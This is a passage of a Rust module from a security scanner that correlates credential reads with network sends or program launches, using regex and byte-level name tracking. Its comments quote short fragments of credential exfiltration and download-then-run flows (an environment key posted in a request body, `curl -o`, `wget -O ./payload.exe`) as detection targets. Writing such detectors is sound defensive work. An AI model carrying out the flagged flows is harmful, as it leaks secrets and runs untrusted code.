//! Finding correlation: the one-hop data-flow check a line regex cannot make.
//!
//! prism-scanner's strongest single detection is its S8 rule: a value read
//! from a credential source (an API key taken from the environment, the
//! contents of an SSH private key) that flows into the payload of a network
//! send. It gets there with a
//! Python-only AST taint tracker. ADR-0005 rules out taint analysis in the
//! declarative corpus — and keeps the engine free of user code — so Sigil
//! makes the same call a different way: over the findings the content phases
//! already produced, in any language.
//!
//! A [`CorrelationRule`] names a *source* selector and a *sink* selector.
//! For every source finding and sink finding in the same file, at most
//! `window_lines` apart with the source first (or on the same line), the
//! link is established when
//!
//! 1. the source line *binds* a name and the sink's argument window (the
//!    sink line and the few lines after it, where a multi-line call keeps its
//!    arguments) uses that name, or
//! 2. source and sink are the same line (`requests.post(u, json={"k":
//!    os.getenv("KEY")})`);
//!
//! and no `sink_excludes` substring appears in that window — `headers=` and
//! `Authorization` are where a key legitimately goes, and excluding them is
//! what keeps every ordinary API client from lighting up.
//!
//! What counts as a use is the rule's `name_uses`. `"word"` reads the name
//! with [`contains_word`], any whole-word occurrence in the argument window,
//! which is how the chains without a statement window linked before the
//! field existed, and how a rule that leaves `name_uses` unset still links
//! outside the statement mode. `"value"` (every built-in chain) links only
//! where the sink sends the bound value (see [`uses_value`]):
//!
//! - **Code, not text.** The window is read with its comments and the
//!   contents of its string literals blanked, by the sink file's language
//!   ([`code_only`]); what a string interpolates stays (`f"...{token:>40}"`,
//!   `f"{token=}"`, `` `${token}` ``, `"$TOKEN"`, `"${TOKEN:-}"`, a
//!   `locals()`-formatted `"{token}"`). A token endpoint's path or a
//!   `# no token here` note is not the token.
//! - **Values, not names.** A keyword argument's name, an assignment target,
//!   an object key (`url=base + "/ping"`, `json={"token": "x"}`, `{ token:
//!   "public" }`), a TypeScript member (`token?: string`), an attribute of
//!   another object (`r.url`), a destructuring target or an export list is
//!   not a use; `data=token`, `json={"k": token}`, `token=token`, `{ token }`,
//!   a Python dict whose key *is* the variable (`{token: 1}`) and a ternary
//!   operand are. A count (`len(secrets)`, `secrets.split("\n").length`) is
//!   a number, not the value.
//! - **The sink's own call.** Outside the statement mode the window is the
//!   sink line and the lines its call continues onto ([`call_scope`]), not
//!   the next function or a log line after it. A sink that names a
//!   destination without sending (a webhook URL, a socket) adds the lines
//!   that use the name it assigns.
//! - **The bound value, not a parameter.** In the body of a function declared
//!   after the source with a parameter of the same name (`def ping(url):`),
//!   the name is that parameter ([`shadowed_from`]), unless the function is
//!   called with the bound value.
//! - **One more hop, where the word reading linked.** A name assigned from
//!   the bound one between the source and the send (`encoded =
//!   urlencode(data)`) is followed when the word reading's window names the
//!   bound name in its code (`Request(url, data=encoded)` beside a bound
//!   `data`), so the value reading makes no link the word reading did not
//!   ([`derived_names`]).
//! - **A same-line link is code.** A source and sink on one line (or one
//!   call) link unless one of them matched only the line's comment
//!   ([`apply_matching`]).
//!
//! A rule may also set `sink_window_before`, which makes the window the
//! sink's *statement* (see [`statement_scope`]). That is for sinks matched on
//! a keyword argument that a formatter puts on its own line at the end of a
//! call (`verify=False,` under `requests.post(`), where the arguments that
//! carry the value are above the sink, not below it. The statement is the
//! lines that *continue into* the sink line — the call's opening line and
//! its earlier arguments, each ending with `(`, `[`, `,`, `\` or an object
//! literal's `{` (see [`continuation_start`]) — the sink line, and the lines
//! its call continues onto. The window adds the nearby lines that set up or
//! use the object the statement works with (a `headers` dict above it, the
//! `agent` it builds used below it). A complete statement about something
//! else (`client = OpenAI(api_key=key)` on the line above) is not read, so a
//! credential used there does not link to an unrelated insecure call. A
//! source finding on a line of the statement is inside the same call, and
//! links without needing a name: `headers={"Authorization":
//! os.environ["TOKEN"]},` above or below `verify=False,` — as long as its
//! line starts in the sink line's bracket group or one nested inside or
//! around it (see [`group_paths`]); a sibling literal of the same statement
//! (`openai: {...}` beside `db: { ssl: {...} }`) is another thing. A whole
//! call is where keyword names and keys live (`headers={"Accept": ...}`,
//! `token=role_token`), so a rule in this mode that leaves `name_uses` unset
//! reads names as values.
//!
//! A rule may set `max_line_length`: a source or sink on a longer line is not
//! linked, because on a minified bundle one line holds a whole program. A
//! rule that reads names as values does not link in a `.map` file at all: a
//! source map holds other files' source as JSON string data, one line of it
//! megabytes long, and none of it runs.
//!
//! A line binds a name by assigning to it (`key = os.getenv(...)`), by the
//! `as` name of a `with` item that *yields* data (`with open(KEY_PATH) as
//! keyfile`, `with urlopen(req) as response` — see [`with_handles`]), or by
//! naming the file it writes (see [`written_paths`]): `open(PATH, 'wb')`,
//! `urlretrieve(url, PATH)`, and the output operand of a download or archive
//! command (`curl -o "$OUT"`, `curl.exe ... -o "{out}"`, `wget -O`,
//! `Invoke-WebRequest -OutFile`, `tar -czf "$TARBALL"`) — a variable, or a
//! literal path such as `"/tmp/managed.pyz"` that the sink repeats. The file
//! binding is what connects a download to the later line that runs the
//! downloaded file, and a project archive to the later line that uploads it:
//! in both, what travels between the two lines is a path, not an assigned
//! expression.
//!
//! Two bindings are deliberately *not* made, because the data flows the
//! other way:
//!
//! - the handle of a file opened for writing (`with open(p, 'w') as out`)
//!   receives data. A login helper that opens `~/.netrc` for writing and then
//!   posts to the auth endpoint writes the *response* into the handle; binding
//!   the handle would report that as the credential file reaching the send.
//! - a sink that *runs a file* (behaviour `executes_program`: an interpreter
//!   on a path, `Start-Process`, `os.startfile`) is linked only through a file
//!   the source line wrote, named on the launch line itself — read by value,
//!   as the program the launch runs ([`launched_operands`]), not a data file
//!   handed to it, its `cwd=` or a comment. What an HTTP call assigns (`data
//!   = client.get(u).json()`) and then hands to a local script as input is
//!   an argument to that script, not the program that runs.
//!
//! Correlation reads rule ids, never severities: a Low observation (an HTTP
//! client call, a subprocess launch, an environment read) is as good a source
//! or sink as a High finding, and the chain carries its own severity.
//!
//! The result is a new finding at the sink line whose snippet names both
//! ends of the chain, so the report explains itself: `Credential read
//! (CRED-012 @L9) reaches network send (NET-001 @L10)`.

use std::cell::OnceCell;
use std::sync::OnceLock;

use regex::Regex;

use crate::corpus::schema::{CorrelationRule, NameUses};

use super::{Finding, Phase, Severity};

/// Lines after the sink line that still count as the sink's arguments.
const SINK_ARG_WINDOW: usize = 5;

fn assignment_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // `name = ...`, `const name = ...`, `let name: T = ...`, `self.name = ...`,
        // `name := ...`. `name` is the last dotted segment, `recv` the object
        // it is an attribute of (`self`, `cfg.inner`), `op` the operator.
        Regex::new(
            r"^\s*(?:(?:const|let|var|export|local|my|our|\$)\s+)?(?:(?P<recv>[A-Za-z_][A-Za-z0-9_]*(?:\.[A-Za-z_][A-Za-z0-9_]*)*)\.)?(?P<name>[A-Za-z_][A-Za-z0-9_]*)\s*(?::\s*[A-Za-z0-9_\[\]<>|, ]+)?\s*(?P<op>:=|=)[^=]",
        )
        .expect("assignment regex compiles")
    })
}

/// The identifier a source line assigns to, if it is an assignment.
pub fn assigned_identifier(line: &str) -> Option<&str> {
    assignment(line).map(|a| a.name)
}

/// An assignment a line makes: `recv.name = rhs`.
struct Assignment<'a> {
    /// The object the name is an attribute of (`self`, `cfg.inner`), if any.
    recv: Option<&'a str>,
    name: &'a str,
    /// What is assigned: the text after the operator.
    rhs: &'a str,
}

fn assignment(line: &str) -> Option<Assignment<'_>> {
    let c = assignment_re().captures(line)?;
    Some(Assignment {
        recv: c.name("recv").map(|m| m.as_str()),
        name: c.name("name")?.as_str(),
        rhs: &line[c.name("op")?.end()..],
    })
}

/// A file opened for writing: `open(PATH, 'wb')`, `open(self.path, "a")`,
/// `open(path, mode="w")`. Captures the last segment of the path expression
/// when it is a (possibly dotted) identifier; a literal path is not a name
/// the sink could repeat as an identifier.
fn open_for_write_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"\bopen\s*\(\s*(?:[A-Za-z_][A-Za-z0-9_]*\.)*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*(?:mode\s*=\s*)?[rbtuf]*["'][rbt]*[wax][bt+]*["']"#,
        )
        .expect("open-for-write regex compiles")
    })
}

/// `with a as x, b as y:` — the names a `with` statement binds.
fn with_as_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\bas\s+([A-Za-z_][A-Za-z0-9_]*)\s*[,:)]").expect("with-as regex compiles")
    })
}

/// `urlretrieve(url, PATH)` / `urllib.request.urlretrieve(url, filename=PATH)`.
fn urlretrieve_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"\burlretrieve\s*\([^,\n]+,\s*(?:filename\s*=\s*)?(?:[A-Za-z_][A-Za-z0-9_]*\.)*([A-Za-z_][A-Za-z0-9_]*)\s*[,)]",
        )
        .expect("urlretrieve regex compiles")
    })
}

/// The output operand of a download or archive command, in shell, in
/// PowerShell, or inside a Python/JS string that builds one:
/// `curl -o "$OUT"`, `curl.exe -L <url> -o "{output_file}"`,
/// `wget -O "${dest}"`, `Invoke-WebRequest <url> -OutFile $path`,
/// `tar -czf "$TARBALL" ...`. Only variable references are captured here
/// (`$X`, `${X}`, `{X}`; `$env:X` is left alone); literal paths are
/// [`literal_target_re`]'s, which takes only paths that cannot be mistaken
/// for an ordinary word.
fn output_operand_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"(?:\s(?:-o|-O|--output|--output-document|-OutFile|--file)|\btar\s+-?[A-Za-z]*c[A-Za-z]*f)(?:\s+|=)["']?(?:\$\{|\$|\{)([A-Za-z_][A-Za-z0-9_]*)"#,
        )
        .expect("output-operand regex compiles")
    })
}

/// A literal file path a line writes: `open("/tmp/x.pyz", "wb")`,
/// `urlretrieve(url, "/tmp/managed.pyz")`, `curl -o /tmp/install.sh`,
/// `wget -O ./payload.exe`. Only a path with a directory separator, or a file
/// name with an executable or archive extension, is captured — a bare word is
/// too common to link on.
fn literal_target_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"(?:\burlretrieve\s*\([^,\n]+,\s*(?:filename\s*=\s*)?["']|(?:\s(?:-o|-O|--output|--output-document|-OutFile)|\btar\s+-?[A-Za-z]*c[A-Za-z]*f)(?:\s+|=)["']?)((?:~|\.{1,2})?/[^\s"';|&)]+|[A-Za-z0-9_.-]+\.(?:sh|py|pyz|pyc|js|exe|ps1|bat|cmd|msi|jar|bin|run|AppImage|dll|so|dylib|tgz|zip))(?:["']?\s*[,)]|["']?\s|["']?$)"#,
        )
        .expect("literal-target regex compiles")
    })
}

/// `open("/tmp/x.pyz", "wb")`: a literal path opened for writing.
fn literal_open_for_write_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"\bopen\s*\(\s*["']((?:~|\.{1,2})?/[^"'\n]+|[A-Za-z0-9_.-]+\.(?:sh|py|pyz|pyc|js|exe|ps1|bat|cmd|msi|jar|bin|run|AppImage|dll|so|dylib))["']\s*,\s*(?:mode\s*=\s*)?[rbtuf]*["'][rbt]*[wax][bt+]*["']"#,
        )
        .expect("literal-open regex compiles")
    })
}

/// Any `open(...)` whose mode writes: `'w'`, `"ab"`, `mode="x"`, `'wb+'`.
/// Used to tell a `with` item that receives data from one that yields it;
/// the path expression may be any call (`open(os.path.expanduser(p), 'w')`).
fn write_mode_open_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r#"\bopen\s*\([^\n]*?,\s*(?:mode\s*=\s*)?["'][rbt]*[wax][rbt+]*["']"#)
            .expect("write-mode open regex compiles")
    })
}

/// Push `s` unless it is a one-character name or already present.
///
/// One-character names (`with open(p, "wb") as f`) are dropped: `f`, `r` and
/// `b` are also string prefixes, so `f"..."` in the sink window would read as
/// a use of the file handle.
fn push_binding<'a>(out: &mut Vec<&'a str>, s: &'a str) {
    if s.len() > 1 && !out.contains(&s) {
        out.push(s);
    }
}

/// The files a line writes, named the way a later line would name them
/// again: `open(PATH, 'wb')`, `urlretrieve(url, PATH)`, the output operand of
/// `curl -o` / `wget -O` / `-OutFile` / `tar -c…f`, or a literal path with a
/// directory or an executable extension. See the module documentation.
pub fn written_paths(line: &str) -> Vec<&str> {
    let res: [&Regex; 5] = [
        open_for_write_re(),
        urlretrieve_re(),
        output_operand_re(),
        literal_target_re(),
        literal_open_for_write_re(),
    ];
    let mut out: Vec<&str> = Vec::new();
    for re in res {
        for c in re.captures_iter(line) {
            if let Some(m) = c.get(1) {
                // A device is not a file anyone runs or uploads afterwards:
                // `curl -o /dev/null <health-check>` writes nothing, and
                // `/dev/null` recurs on unrelated lines (`>/dev/null`).
                if m.as_str().starts_with("/dev/") {
                    continue;
                }
                push_binding(&mut out, m.as_str());
            }
        }
    }
    out
}

/// The `as` names of a `with` statement whose item *yields* data: a file
/// opened for reading, a response, any other context manager. The handle of
/// a file opened for writing receives data, so it is not bound — see the
/// module documentation.
pub fn with_handles(line: &str) -> Vec<&str> {
    let trimmed = line.trim_start();
    if !(trimmed.starts_with("with ") || trimmed.starts_with("async with ")) {
        return Vec::new();
    }
    let mut out: Vec<&str> = Vec::new();
    let mut item_start = 0;
    for c in with_as_re().captures_iter(line) {
        let (Some(whole), Some(name)) = (c.get(0), c.get(1)) else {
            continue;
        };
        let item = &line[item_start..whole.start()];
        item_start = whole.end();
        if write_mode_open_re().is_match(item) {
            continue;
        }
        push_binding(&mut out, name.as_str());
    }
    out
}

/// The files a line writes and the data handles it opens: everything a line
/// binds besides an assignment.
pub fn written_targets(line: &str) -> Vec<&str> {
    let mut out = written_paths(line);
    for h in with_handles(line) {
        push_binding(&mut out, h);
    }
    out
}

/// Every name a source line binds: its assignment target, then the files it
/// writes and the data handles it opens.
fn source_bindings(line: &str) -> Vec<&str> {
    let mut out: Vec<&str> = Vec::new();
    if let Some(ident) = assigned_identifier(line) {
        out.push(ident);
    }
    for t in written_targets(line) {
        if !out.contains(&t) {
            out.push(t);
        }
    }
    out
}

/// Whether a sink *runs a file*: then only a file the source line wrote can
/// link to it (see the module documentation).
fn runs_a_file(rule_id: &str) -> bool {
    super::profile::behavior_for(rule_id) == Some("executes_program")
}

/// Does `ident` appear as a whole word in `text`?
fn contains_word(text: &str, ident: &str) -> bool {
    let bytes = text.as_bytes();
    let mut start = 0;
    while let Some(pos) = text[start..].find(ident) {
        let at = start + pos;
        let end = at + ident.len();
        let before_ok = at == 0 || !is_ident_byte(bytes[at - 1]);
        let after_ok = end >= bytes.len() || !is_ident_byte(bytes[end]);
        if before_ok && after_ok {
            return true;
        }
        start = at + 1;
    }
    false
}

fn is_ident_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// Is `name` an identifier (as opposed to a literal path a line writes)?
fn is_identifier(name: &str) -> bool {
    let b = name.as_bytes();
    b.first()
        .is_some_and(|c| c.is_ascii_alphabetic() || *c == b'_')
        && b.iter().all(|&c| is_ident_byte(c))
}

/// The start offsets of the whole-word occurrences of `ident` in `text`.
///
/// Every bound name is an identifier or a path, and starts with an ASCII
/// byte, so the byte after an occurrence's start is a char boundary.
fn occurrences<'a>(text: &'a str, ident: &'a str) -> impl Iterator<Item = usize> + 'a {
    let bytes = text.as_bytes();
    let mut start = 0;
    std::iter::from_fn(move || {
        if ident.is_empty() {
            return None;
        }
        while let Some(pos) = text.get(start..)?.find(ident) {
            let at = start + pos;
            let end = at + ident.len();
            start = at + 1;
            let before_ok = at == 0 || !is_ident_byte(bytes[at - 1]);
            let after_ok = end >= bytes.len() || !is_ident_byte(bytes[end]);
            if before_ok && after_ok {
                return Some(at);
            }
        }
        None
    })
}

/// Does `ident` appear in `text` as a *value*: a whole word that is not only
/// a name something else is given to?
///
/// [`statement_scope`] decides with this which lines around a sink belong to
/// its statement, and [`uses_value`] (the link test of a rule with
/// `name_uses: "value"`) starts from it. Keyword-argument names and object
/// keys are the names a call's parameters have, whatever is passed:
/// `headers={"Accept": "json"}` does not use a `headers` dict bound from a
/// token two functions up, `hvac.Client(token=role_token)` does not use a
/// `token` variable, and `{ token: "public" }` does not either. So an
/// occurrence is skipped when it is followed by `=` (not `==`: a keyword
/// argument, or an assignment target), or when it is a key: followed by `:`
/// (not `::`), after `{`, `,`, `(`, `;` or at the start of the line, bare or
/// quoted (`"token": ...`), or a TypeScript member (`token?: string`,
/// `private token: string`). The value side is still a use: `headers=headers`,
/// `{ auth: token }`, `f"Bearer {token}"`, `{ agent, headers }`, and a
/// variable reference, `$TOKEN` or `${TOKEN:-default}`.
fn uses_word(text: &str, ident: &str) -> bool {
    let bytes = text.as_bytes();
    occurrences(text, ident)
        .any(|at| !names_a_parameter(bytes, at, at + ident.len(), Lang::Other, &mut || None))
}

/// Is the word at `bytes[at..end]` a keyword-argument name, an assignment
/// target or an object key (see [`uses_word`])? `lang` is the sink file's:
/// in Python a bare `name:` inside `{...}` is a dict key *expression*, which
/// is the variable's value, not a name. `innermost` says which bracket is
/// open at `at` (see [`OpenBrackets`]); it is asked only for that Python
/// case.
fn names_a_parameter(
    bytes: &[u8],
    at: usize,
    end: usize,
    lang: Lang,
    innermost: &mut dyn FnMut() -> Option<u8>,
) -> bool {
    let is_blank = |b: u8| b == b' ' || b == b'\t';
    // A variable reference reads the variable: `${TOKEN:-}`, `${TOKEN=x}`
    // and `"$TOKEN=1"` send it. Only `$name = ...` opening a line (PHP,
    // PowerShell, Perl) assigns to it.
    if at >= 2 && bytes[at - 1] == b'{' && bytes[at - 2] == b'$' {
        return false;
    }
    let dollar = at >= 1 && bytes[at - 1] == b'$';
    // A quoted key: `"token": ...` / `'token': ...`.
    let quote = at
        .checked_sub(1)
        .map(|i| bytes[i])
        .filter(|&q| (q == b'"' || q == b'\'') && bytes.get(end) == Some(&q));
    let mut j = if quote.is_some() { end + 1 } else { end };
    // TypeScript's optional and definite members: `token?: T`, `token!: T`.
    let marked = quote.is_none()
        && matches!(bytes.get(j), Some(b'?' | b'!'))
        && bytes.get(j + 1) == Some(&b':');
    if marked {
        j += 1;
    }
    while j < bytes.len() && is_blank(bytes[j]) {
        j += 1;
    }
    let after = bytes.get(j + 1).copied();
    match bytes.get(j) {
        Some(b'=') if quote.is_none() && !marked => {
            after != Some(b'=') && (!dollar || starts_its_line(bytes, at - 1))
        }
        Some(b':') if after != Some(b':') && !dollar => {
            let start = if quote.is_some() { at - 1 } else { at };
            in_key_position(bytes, start, lang, quote.is_none(), innermost)
        }
        _ => false,
    }
}

/// Is only blank space between the start of its line and `i`?
fn starts_its_line(bytes: &[u8], i: usize) -> bool {
    bytes[..i]
        .iter()
        .rev()
        .take_while(|&&b| b != b'\n')
        .all(|&b| b == b' ' || b == b'\t')
}

/// Is a `name:` whose name (or opening quote) starts at `start` a key: after
/// `{`, `,`, `(` or `;`, at the start of the text or of a line, or after a
/// TypeScript member modifier?
fn in_key_position(
    bytes: &[u8],
    start: usize,
    lang: Lang,
    bare: bool,
    innermost: &mut dyn FnMut() -> Option<u8>,
) -> bool {
    let mut i = start;
    while i > 0 && (bytes[i - 1] == b' ' || bytes[i - 1] == b'\t') {
        i -= 1;
    }
    // `{token: "host"}` in Python sends the variable's value as the key.
    let mut python_dict = || bare && lang == Lang::Python && innermost() == Some(b'{');
    if i == 0 {
        return !python_dict();
    }
    match bytes[i - 1] {
        b'{' | b',' | b'(' | b';' => !python_dict(),
        b'\n' => {
            // After a line that ends with `?`, the name is the operand of a
            // ternary laid out with its operators at line ends (`leak ?` /
            // `token :` / `"x"`), not a key.
            let mut k = i - 1;
            while k > 0 && bytes[k - 1].is_ascii_whitespace() {
                k -= 1;
            }
            (k == 0 || bytes[k - 1] != b'?') && !python_dict()
        }
        _ => {
            let mut k = i;
            while k > 0 && is_ident_byte(bytes[k - 1]) {
                k -= 1;
            }
            matches!(
                &bytes[k..i],
                b"private"
                    | b"public"
                    | b"protected"
                    | b"readonly"
                    | b"static"
                    | b"declare"
                    | b"abstract"
                    | b"override"
            )
        }
    }
}

/// The bracket still open at an offset of one text, for offsets asked in
/// increasing order: each call reads only the bytes since the last one, so
/// asking at every occurrence of a name on a long line stays linear.
/// An unmatched closing bracket closes whatever is open, the same answer a
/// scan backwards from the offset gives.
#[derive(Default)]
struct OpenBrackets {
    pos: usize,
    stack: Vec<u8>,
}

impl OpenBrackets {
    fn innermost(&mut self, bytes: &[u8], at: usize) -> Option<u8> {
        if at < self.pos {
            *self = OpenBrackets::default();
        }
        for &b in &bytes[self.pos..at] {
            match b {
                b'(' | b'[' | b'{' => self.stack.push(b),
                b')' | b']' | b'}' => {
                    self.stack.pop();
                }
                _ => {}
            }
        }
        self.pos = at;
        self.stack.last().copied()
    }
}

/// Does `ident` appear in `code` as a value the sink's statement sends: the
/// link test of a rule with `name_uses: "value"`.
///
/// `code` is the window with what is not code blanked ([`code_only`]): a
/// word inside a string literal or a comment is not a use, while what a
/// string interpolates is (`f"...{token:>40}"`, `` `${token}` ``,
/// `"$TOKEN"`). On top of [`uses_word`], an occurrence is skipped when it is
///
/// - an attribute of another object: `r.url` is not a bound `url`. The
///   object's own state (`self.token`, `this.token`), and the attribute path
///   the source line assigned (`recv`, `cfg` in `cfg.token = ...`), are;
///   `...token` spreads the value;
/// - inside the target of a destructuring or tuple assignment
///   (`const { token } = await res.json()`, `user, token = pair`);
/// - on a line that only exports names (`export { token }`,
///   `module.exports = { token, health }`).
fn uses_value(code: &str, ident: &str, lang: Lang, recv: Option<&str>) -> bool {
    uses_value_before(code, ident, lang, recv, code.len())
}

/// [`uses_value`], counting only the occurrences that start before `limit`:
/// from there on the name is a function's parameter (see [`shadowed_from`]).
///
/// Linear in the length of `code`, however often `ident` repeats in it: the
/// open bracket and each line's facts are worked out once, as the
/// occurrences are read in order.
fn uses_value_before(
    code: &str,
    ident: &str,
    lang: Lang,
    recv: Option<&str>,
    limit: usize,
) -> bool {
    let bytes = code.as_bytes();
    let mut open = OpenBrackets::default();
    let mut line = LineFacts::default();
    occurrences(code, ident)
        .take_while(|&at| at < limit)
        .any(|at| {
            // The line's facts first: they ask for the bracket open at the
            // line's start, which is before `at`.
            !line.excludes(code, at, &mut open)
                && !names_a_parameter(bytes, at, at + ident.len(), lang, &mut || {
                    open.innermost(bytes, at)
                })
                && !an_attribute_of_another_object(bytes, at, recv)
                && !only_counted(bytes, at, at + ident.len())
        })
}

/// What a line says about the names on it, worked out once per line by
/// [`uses_value_before`]: the target of a destructuring or tuple assignment
/// the line makes, and whether it only exports names.
#[derive(Default)]
struct LineFacts {
    /// The line, as a byte range of the text; `None` before the first ask.
    range: Option<std::ops::Range<usize>>,
    /// The assignment target, as a byte range of the text.
    target: Option<std::ops::Range<usize>>,
    export: bool,
}

impl LineFacts {
    /// Is the occurrence at `at` in an assignment pattern, or on an export
    /// line? A line that starts inside an open bracket continues a call or
    /// a literal (`requests.post(url,` / `    token, timeout=5)`), and
    /// assigns nothing.
    fn excludes(&mut self, code: &str, at: usize, open: &mut OpenBrackets) -> bool {
        if !self.range.as_ref().is_some_and(|r| r.contains(&at)) {
            let bytes = code.as_bytes();
            let range = line_around(bytes, at);
            let continues = open.innermost(bytes, range.start).is_some();
            self.target = assignment_pattern(&bytes[range.clone()])
                .filter(|_| !continues)
                .map(|t| range.start + t.start..range.start + t.end);
            self.export = code
                .get(range.clone())
                .is_some_and(|l| export_list_re().is_match(l));
            self.range = Some(range);
        }
        self.export || self.target.as_ref().is_some_and(|t| t.contains(&at))
    }
}

/// How far [`only_counted`] reads the member chain after a name: a longer
/// one is read as a use, which keeps a long line of them linear.
const MAX_CHAIN: usize = 256;

/// Is the occurrence at `bytes[at..end]` only counted: the argument of
/// `len(...)` (`len(secrets)`, `len(secrets.splitlines())`), or the head of
/// a member chain that ends in `.length`, `.size` or `.count(...)`
/// (`secrets.split("\n").length`)? A count of a secret's lines is a number,
/// not the secret.
fn only_counted(bytes: &[u8], at: usize, end: usize) -> bool {
    // The member chain after the name: `.name` steps and bracketed groups.
    let mut j = end;
    let mut last: &[u8] = b"";
    let mut last_called = false;
    while j < bytes.len() && j - end <= MAX_CHAIN {
        match bytes[j] {
            b'.' => {
                let s = j + 1;
                let mut k = s;
                while k < bytes.len() && is_ident_byte(bytes[k]) {
                    k += 1;
                }
                if k == s {
                    break;
                }
                last = &bytes[s..k];
                last_called = false;
                j = k;
            }
            b'(' | b'[' => {
                let mut depth = 0usize;
                let mut k = j;
                while k < bytes.len() && k - end <= MAX_CHAIN {
                    match bytes[k] {
                        b'(' | b'[' | b'{' => depth += 1,
                        b')' | b']' | b'}' => {
                            depth -= 1;
                            if depth == 0 {
                                break;
                            }
                        }
                        _ => {}
                    }
                    k += 1;
                }
                if depth != 0 {
                    return false;
                }
                last_called = bytes[j] == b'(';
                j = k + 1;
            }
            _ => break,
        }
    }
    if j - end > MAX_CHAIN {
        return false;
    }
    let mut i = at;
    while i > 0 && (bytes[i - 1] == b' ' || bytes[i - 1] == b'\t') {
        i -= 1;
    }
    let mut k = j;
    while k < bytes.len() && (bytes[k] == b' ' || bytes[k] == b'\t') {
        k += 1;
    }
    let in_len = i >= 4
        && &bytes[i - 4..i] == b"len("
        && (i == 4 || !is_ident_byte(bytes[i - 5]))
        && bytes.get(k) == Some(&b')');
    in_len
        || (matches!(last, b"length" | b"size") && !last_called)
        || (last == b"count" && last_called)
}

/// The receiver path [`an_attribute_of_another_object`] reads back over is
/// at most this long; a longer run of dotted names is not `self`, `this` or
/// the source's own receiver, and stopping keeps a long line of them linear.
const MAX_RECEIVER: usize = 256;

/// Is the occurrence at `at` an attribute of an object other than the one
/// the name was bound on (see [`uses_value`])?
fn an_attribute_of_another_object(bytes: &[u8], at: usize, recv: Option<&str>) -> bool {
    if at == 0 || bytes[at - 1] != b'.' || (at >= 3 && &bytes[at - 3..at] == b"...") {
        return false;
    }
    let mut k = at - 1;
    while k > 0 && at - k <= MAX_RECEIVER && (is_ident_byte(bytes[k - 1]) || bytes[k - 1] == b'.') {
        k -= 1;
    }
    let path = &bytes[k..at - 1];
    if matches!(path, b"self" | b"this" | b"cls") {
        return false;
    }
    !recv.is_some_and(|r| {
        let r = r.as_bytes();
        path.ends_with(r) && (path.len() == r.len() || path[path.len() - r.len() - 1] == b'.')
    })
}

/// The line of `bytes` that holds offset `at`, as a byte range.
fn line_around(bytes: &[u8], at: usize) -> std::ops::Range<usize> {
    let start = bytes[..at]
        .iter()
        .rposition(|&b| b == b'\n')
        .map_or(0, |p| p + 1);
    let end = bytes[at..]
        .iter()
        .position(|&b| b == b'\n')
        .map_or(bytes.len(), |p| at + p);
    start..end
}

/// The target of a destructuring or tuple assignment `line` makes, as a
/// byte range of the line: a `{...}`, `[...]` or `(...)` pattern, or names
/// joined by commas, before the line's first `=` (see [`uses_value`]).
fn assignment_pattern(line: &[u8]) -> Option<std::ops::Range<usize>> {
    let mut p = 0;
    loop {
        while p < line.len() && (line[p] == b' ' || line[p] == b'\t') {
            p += 1;
        }
        match [b"const ".as_slice(), b"let ", b"var "]
            .iter()
            .find(|k| line[p..].starts_with(k))
        {
            Some(k) => p += k.len(),
            None => break,
        }
    }
    let start = p;
    let bracketed = line.get(p).is_some_and(|b| b"{[(".contains(b));
    let mut comma = false;
    let mut prev = 0u8;
    while p < line.len() {
        let b = line[p];
        match b {
            b'=' => {
                let next = line.get(p + 1).copied();
                let assigns =
                    next != Some(b'=') && next != Some(b'>') && !b"!<>+-*/%&|^:".contains(&prev);
                return (assigns && (bracketed || comma)).then_some(start..p);
            }
            b',' => comma = true,
            // `send(url, token=...)` is a call, not a pattern.
            b'(' if is_ident_byte(prev) => return None,
            _ if is_ident_byte(b) || b" \t{}[]():.*$".contains(&b) => {}
            _ => return None,
        }
        if b != b' ' && b != b'\t' {
            prev = b;
        }
        p += 1;
    }
    None
}

/// A line that exports a list of names: `export { token }`,
/// `module.exports = { token, health };`.
fn export_list_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"^\s*(?:export\s+(?:default\s+)?|module\.exports\s*=\s*)\{[\s\w$,:]*\}\s*;?\s*$",
        )
        .expect("export-list regex compiles")
    })
}

/// How [`code_only`] tells code from comments and strings in a file, chosen
/// by its extension.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Lang {
    /// `#` comments; `'`, `"` and triple-quoted strings with their prefixes,
    /// and f-strings.
    Python,
    /// Shell, PowerShell, Ruby, Perl, YAML, TOML: `#` comments after a blank;
    /// `'` and `"` strings.
    Hash,
    /// JavaScript, TypeScript and the C family: `//` and `/* */` comments;
    /// `'`, `"` and `` ` `` strings.
    CLike,
    /// PHP: both comment styles.
    Php,
    /// Markdown and plain text, whose code blocks may be any language: `#`
    /// and `//` comments after a blank; `'` and `"` strings (an apostrophe in
    /// a word opens none).
    Prose,
    /// Anything else (JSON, notebooks, HTML, files without an extension):
    /// read as it is.
    Other,
}

impl Lang {
    fn of(file: &str) -> Lang {
        let base = file.rsplit(['/', '\\']).next().unwrap_or(file);
        if base == "Dockerfile" || base == "Makefile" {
            return Lang::Hash;
        }
        let ext = base
            .rsplit_once('.')
            .map(|(_, e)| e.to_ascii_lowercase())
            .unwrap_or_default();
        match ext.as_str() {
            "py" | "pyw" | "pyi" => Lang::Python,
            "sh" | "bash" | "zsh" | "ksh" | "ps1" | "psm1" | "rb" | "pl" | "pm" | "yml"
            | "yaml" | "toml" => Lang::Hash,
            "js" | "mjs" | "cjs" | "jsx" | "ts" | "mts" | "cts" | "tsx" | "go" | "java" | "kt"
